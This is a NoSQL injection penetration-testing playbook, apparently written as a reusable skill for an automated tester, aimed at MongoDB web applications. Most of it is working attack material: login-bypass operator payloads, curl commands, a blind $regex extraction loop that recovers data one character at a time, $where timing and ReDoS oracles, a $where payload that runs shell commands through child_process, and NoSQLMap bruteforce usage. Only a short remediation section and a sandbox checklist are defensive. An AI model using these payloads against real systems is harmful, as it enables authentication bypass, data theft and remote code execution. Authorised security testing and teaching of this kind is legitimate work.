# NoSQL Injection — Skill Playbook

**Mitre ATT&CK ID:** T1190 (Exploit Public-Facing Application)
**OWASP Mapping:** A03:2021 – Injection
**Severity:** Critical / High
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: nosql-injection-v1
category: penetration-testing
author: HiveBreach
mitre_attack_id: T1190
owasp_mapping:
  - A03:2021-Injection
tags:
  - nosql
  - mongodb
  - injection
  - web-application
  - T1190
  - blind-nosql
  - timing-attack
environments:
  - web
  - mongodb
  - php
  - node
  - python
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Entry Point Enumeration

NoSQL injection appears in:
- Login / authentication forms (username, password fields)
- JSON API bodies (POST/PUT/PATCH `{"user":"x","pass":"y"}`)
- Search / filter endpoints (`?name=`, `?price=`, `?category=`)
- Session tokens and JWT fields queried server-side
- Query parameters that reach MongoDB `find()`, `$where`, or aggregate pipelines

### 1.2 Detection Payloads (PayloadsAllTheThings + HackTricks)

**URL-encoded operator injection (traditional param):**
```
?username=admin&password=admin
?username=admin%27||%271%27%3D%3D%271&password=admin
?username=admin&password[$ne]=x
?username[$ne]=x&password[$ne]=x
?username[$exists]=true&password[$gt]=
?username[$regex]=^a.*$&password[$regex]=^
```

**JSON body operator injection:**
```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$in":["admin","root"]},"password":{"$gt":""}}
{"username":{"$regex":".*"},"password":{"$regex":".*"}}
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

### 1.3 Response-Based Fingerprinting

- MongoDB errors leak `MongoServerError`, `not authorized for query on db.collection`
- Pagination/filter endpoints respond differently when arrays are passed to scalar params
- Send `{"username":["admin"]}` to a field expecting a string — a 500 or type error indicates a NoSQL backend

---

## 2. Confirmation

### 2.1 Auth Bypass Confirmation

```bash
# Compare authenticated vs unauthenticated behavior
curl -s https://target.com/login \
  -d '{"username":"admin","password":{"$ne":""}}' \
  -H 'Content-Type: application/json'
# Response 302/set-cookie session -> bypass confirmed
```

### 2.2 Logical Test Confirmation

```bash
# True condition
curl -s "https://target.com/api/user?name[$regex]=.*"
# False condition
curl -s "https://target.com/api/user?name[$regex]=^ZZZ_NOT_FOUND"
# Response size/timing differs -> injection point confirmed
```

### 2.3 PHP MongoDB Injection

PHP mongo driver (legacy `MongoDB\Driver\Query`) casts array parameters into operators:
```http
GET /search?user[email]=admin&user[password]=bar
POST /login
user[email]=admin&user[password][$gt]=
```

```bash
curl -s "https://target.com/login" \
  -d 'user[email]=admin@example.com&user[password][$gt]='
```

---

## 3. Exploitation

### 3.1 Authentication Bypass

**MongoDB `$ne` / `$gt`:**
```json
{"username":{"$ne":"null"},"password":{"$ne":"null"}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":{"$in":["admin","administrator","root"]},"password":{"$gt":""}}
```

**`$or` injection:**
```json
{"$or":[{"username":"admin"},{"username":true}],"password":{"$gt":""}}
```

### 3.2 Data Extraction with `$regex`

Extract a value field-by-field (blind) using regex operators:
```json
{"username":"admin","password":{"$regex":"^a"}}
{"username":"admin","password":{"$regex":"^ab"}}
{"username":"admin","password":{"$regex":"^abc"}}
```

**Character-by-character oracle script:**
```bash
for c in {a..z}; do
  if curl -s "https://target.com/api/items?sku[$regex]=^hive$c" | grep -q "item"; then
    echo "char: $c"
  fi
done
```

### 3.3 `$where` JavaScript Injection (RCE-capable)

```json
{"$where":"this.password == 'x' || true"}
{"$where":"sleep(5000)"}
{"$where":"function(){ if(this.name=='admin') return true; return false; }()"}
{"$where":"this.username=='admin' && (function(){throw 'x'})()"}
```

**Extract via error side-channel with `$where`:**
```json
{"$where":"this.name.match(/^a/) ? 1 : 0"}
```

### 3.4 Blind NoSQL with Timing

```bash
# $where sleep oracle
curl -s "https://target.com/api/find" \
  -d '{"$where":"function(){ sleep(3000); return true; }()"}'
# Compare response times: sleep confirmed -> JS execution

# Regex timing oracle (regexp catastrophic backtracking on large values)
curl -s "https://target.com/api/user?name[$regex]=^(a+)+$"
```

### 3.5 Extraction to File / Command

When `$where` and server allows DB stored functions:
```json
{"$where":"this.a==1 && this.b==2 && function(){ require('child_process').exec('id', function(e,s,c){ print(s) }) }()"}
```

---

## 4. Tool-Specific Guidance

### 4.1 NoSQLMap

```bash
git clone https://github.com/codingo/NoSQLMap
cd NoSQLMap && python3 nosqlmap.py
```

**Interactive usage:**
```
1. Set target host/port and web app
2. Choose "NoSQL DB Attack Options" -> Mongo
3. Enumerate databases and collections
4. Dump/bruteforce collections
```

**Command line:**
```bash
python3 nosqlmap.py --target http://target.com --db mongodb \
  --bruteforce --threads 5
```

### 4.2 Burp Suite / Intruder

1. Send login request to Intruder
2. Attack the username field with `{"$ne":null}`, `{"$gt":""}`, `{"$regex":".*"}`
3. Use the "NoSQLi" tab of Burp extensions or `Nosqli` Burp extension for `$where` detection
4. Grep response for session cookies / HTTP 302 to detect bypass

### 4.3 Nuclei

```bash
nuclei -u https://target.com -t ~/nuclei-templates/vulnerabilities/ -jsonl out.jsonl
```

---

## 5. PoC Generation

### PoC Template

```markdown
## NoSQL Injection — [FINDING_ID]

**URL:** https://target.com/login
**Method:** POST /api/login
**Backend:** MongoDB (PHP driver / Node.js mongoose)

### Payload
```json
{"username":{"$ne":null},"password":{"$ne":null}}
```

### Evidence
```
HTTP/1.1 200 OK
Set-Cookie: session=valid-0a...  (admin session issued)
```

### Impact
- Auth bypass: YES
- Data extraction: YES/NO
- RCE via $where: YES/NO

### Remediation
- Validate and type-check all query parameters; forbid operator keys
- Use parameterised/ORM queries; do not pass user input into find()
- Disable `$where` unless strictly required
- Apply allow-list for field names

### Reproduction Steps
1. POST `{"username":{"$ne":null},"password":{"$ne":null}}`
2. Observe admin session cookie in response
3. Repeat with `$regex` to enumerate other users
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Backend (MongoDB version, driver) identified
- [ ] Blind extraction tested only against sandbox dataset
- [ ] `$where` RCE attempted only in disposable container
- [ ] No production writes performed (GET/read-only payloads first)
- [ ] Evidence (request + response pairs) captured

---

## 7. Cheat Sheet/Reference

| Goal | Payload |
|---|---|
| Bypass login | `{"password":{"$ne":"x"}}` |
| Bypass login (array) | `password[$ne]=x` |
| Match any | `{"$regex":".*"}` |
| Field exists | `{"$exists":true}` |
| Range | `{"$gt":""}` / `{"$lt":"~"}` |
| Enum char | `{"$regex":"^ch[a-z]"}` |
| JS exec | `{"$where":"sleep(3000)"}` |
| In list | `{"$in":["admin","root"]}` |
| Not equal | `{"$nin":[""]}` |

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial access |
| T1005 | Data from Local System | Data extraction |
| T1078 | Valid Accounts | Auth bypass result |
| T1059.007 | Command and Scripting Interpreter: JavaScript | `$where` RCE |

---

## 9. References

- PayloadsAllTheThings NoSQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
- HackTricks NoSQL injection: https://book.hacktricks.xyz/pentesting-web/nosql-injection
- NoSQLMap: https://github.com/codingo/NoSQLMap
- PortSwigger NoSQL injection: https://portswigger.net/web-security/nosql-injection

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
